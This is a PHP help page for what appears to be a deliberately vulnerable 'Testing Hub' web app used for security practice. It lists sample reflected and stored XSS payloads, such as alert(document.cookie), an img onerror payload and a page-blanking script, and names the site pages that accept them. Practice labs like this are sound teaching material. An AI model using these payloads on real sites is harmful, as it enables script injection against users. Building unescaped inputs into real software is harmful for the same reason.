<?php
$page_title = 'Help Page';
include ('includes/theader.html');


// Display the form:?>
<div class="flex-container">
    <h1>Help Section</h1>	
    <br>
    <h3>Here will be the area to seek help on what you can do for this Testing Hub.</h3>
    <div class="flex-con" style="align-items: flex-start;"><div class="flex-container">
        <h3><p>EXAMPLE XSS ATTACK SCRIPTS</p></h3>        
        <p>Reflected XSS</p>
        <p>1. &lt;script&gt;alert("XSS Attack");&lt;/script&gt;</p>
        <p>2. &lt;script&gt;alert(document.cookie);&lt;/script&gt;</p>
        <p>3. &lt;script&gt;alert(document.domain);&lt;/script&gt;</p>
        <p>4. &lt;script&gt;alert(document.URL);&lt;/script&gt;</p>
        <p>5. &lt;script&gt;alert(document.title);&lt;/script&gt;</p>
        <p>Stored XSS</p>
        <p>1. &lt;img src=x onerror=alert(document.cookie)&gt;</p>
        <p>2. &lt;script&gt;document.documentElement.innerHTML=''&lt;/script&gt;</p>
    </div><div class="flex-container">
        <h3><p>ALL AREAS THAT CAN USE XSS ATTACK SCRIPTS</p></h3>
        <p><a href="Home">1. Search Bar</a></p>
        <p><a href="login">2. Login Page</a></p>
        <p><a href="register">3. Register Page</a></p>
        <p><a href="profile">4. Profile Page</a></p>
        <p><a href="browse">5. Collection Page (through Browse Page)</a></p>
    </div></div>
</div>



<?php include ('includes/footer.html'); ?>
